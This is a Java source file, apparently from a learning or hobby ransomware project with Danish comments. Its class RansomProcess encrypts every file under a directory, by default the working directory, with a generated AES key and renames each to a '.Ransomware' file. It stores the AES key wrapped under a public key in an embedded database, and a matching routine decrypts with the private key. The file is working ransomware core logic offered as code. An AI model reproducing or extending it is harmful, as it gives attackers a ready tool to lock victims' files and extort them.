
import com.fasterxml.jackson.databind.ObjectMapper;

import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.UncheckedIOException;
import java.nio.file.AccessDeniedException;
import java.security.GeneralSecurityException;
import java.security.NoSuchAlgorithmException;
import java.sql.SQLException;
import java.util.*;


public class RansomProcess {


    private String PathtoFind;

    public RansomProcess() {
        this.PathtoFind = getDefaultPath();
    }

    public RansomProcess(String PathtoFind) {
        this.PathtoFind = PathtoFind;
    }


    public void StartEncryptProcess(String pubkey) {
        // læg alle filer i "PathtoFind" sti ind i hashmaps, der mapper fra filsti til extension
        final TreeMap<String, HashMap<String, String>> containsFilters = new SearchDirectory(this.PathtoFind).GetFileMap();
        final Set set = containsFilters.entrySet();

        // iterator til iterering over mængde af (key,value) par i hashmap
        // key,value = sti, filsti -> fil extension map
        final Iterator iterator = set.iterator();
        SecretKeySpec aesKey = null;

        try {
            // opret aes keyspec til senere kryptering
            aesKey = CryptoRansomware.GenKey();
            while (iterator.hasNext()) {
                final Map.Entry mentry = (Map.Entry) iterator.next();

                //   System.out.print("key is: " + mentry.getKey() + " & Value is: " + mentry.getValue());

                // Map = filsti -> extension
                final Object obj = mentry.getValue();
                final ObjectMapper oMapper = new ObjectMapper();
                final HashMap<String, String> Map = oMapper.convertValue(obj, HashMap.class);


                final Set mapset = Map.entrySet();
                final Iterator mapiterator = mapset.iterator();

                while (mapiterator.hasNext()) {

                    // entry = filsti, fil extension map
                    Map.Entry entry = (Map.Entry) mapiterator.next();

                    // opret fil objekt til læsning af fil, der skal krypteres
                    final File filein = new File(entry.getKey() + "." + entry.getValue());

                    // opret fil ojekt til skrivning af krypteret data
                    final File fileout = new File(entry.getKey() + ".Ransomware");

                    // krypter fil
                    CryptoRansomware.EncryptFile(filein, fileout, aesKey);
                }

            }

            // indsæt i database: alle hashmaps indeholdende informationer om krypterede stier, filstier, og filernes originale extension
            // indsæt også den krypterede public key
            EmbeddedDatabase.InsertRecordIntoTable(containsFilters, CryptoRansomware.RetrieveEncryptedAesKey(pubkey, aesKey));
        //hvis der opstå en fejl som er en af dem som er lavet en catch på så stopper den koden og skriver fejlen ud
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (RansomwareException e) {
            System.out.println("Already Encrypted Try Decrypt");
        } catch (SQLException e) {
            System.out.println("SqlException Caught");
        } catch (GeneralSecurityException e) {
            System.out.println("Cipher Error");
        } catch (UncheckedIOException e) {
            System.out.println("cannot encrypt");
        }

    }

    public void StartDecryptProcess(String privKey) {
        try {
            final TreeMap<String, HashMap<String, String>> containsFilters = EmbeddedDatabase.GetMapFromTable();
            final Set set = containsFilters.entrySet();
            final Iterator iterator = set.iterator();


            final SecretKeySpec aesKey = CryptoRansomware.RetrieveAesKey(privKey);
            while (iterator.hasNext()) {
                final Map.Entry mentry = (Map.Entry) iterator.next();

                //   System.out.print("key is: " + mentry.getKey() + " & Value is: " + mentry.getValue());

                final Object obj = mentry.getValue();
                final ObjectMapper oMapper = new ObjectMapper();
                final HashMap<String, String> Map = oMapper.convertValue(obj, HashMap.class);


                final Set mapset = Map.entrySet();
                final Iterator mapiterator = mapset.iterator();

                while (mapiterator.hasNext()) {

                    Map.Entry entry = (Map.Entry) mapiterator.next();
                    final File filein = new File(entry.getKey() + "." + entry.getValue());
                    final File fileout = new File(entry.getKey() + ".Ransomware");


                    CryptoRansomware.DecryptFile(fileout, filein, aesKey);
                }

            }
//hvis der opstå en fejl som er en af dem som er lavet en catch på så stopper den koden og skriver fejlen ud
            //hvis der opstå en fejl med printStackTrace printer den bare den samme Exception ud.
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (SQLException e) {
            e.printStackTrace();
        } catch (GeneralSecurityException e) {
            e.printStackTrace();
        } catch (NullPointerException e) {
            System.out.println("Map not Exists Encrypt First");
        } catch (UncheckedIOException e) {
            System.out.println("cannot decrypt");
       //finally kører selvom der har været en Exception som stopper koden.
        } finally {
            EmbeddedDatabase.DropTable();
        }

    }

    private String getDefaultPath() {
        String path = System.getProperty("user.dir");
        return path;
    }

    public void ProcessClose() {
        EmbeddedDatabase.shutdown();
    }


}
